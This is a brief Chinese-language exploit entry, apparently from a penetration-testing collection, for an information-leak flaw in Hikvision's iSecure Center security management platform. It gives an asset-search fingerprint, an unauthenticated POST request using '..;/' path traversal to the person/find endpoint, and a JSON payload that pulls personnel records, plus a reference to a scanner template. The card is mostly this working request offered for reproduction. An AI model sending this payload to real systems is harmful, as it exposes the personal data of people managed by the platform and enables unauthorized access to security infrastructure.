# 海康威视iSecureCenter综合安防管理平台find信息泄漏漏洞

- **系统**：海康　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`POST /isupm/api/api/..;/..;/person/find HTTP/1.1`
- **关键头**：`Content-Length: 95`　`Content-Type: application/json;charset=utf-8`

**请求体 / payload**
```
{"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}

\[hikvision-find-info.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 海康威视iSecure Center综合安防管理平台find信息泄漏漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * HIKVISION 综合安防管理平台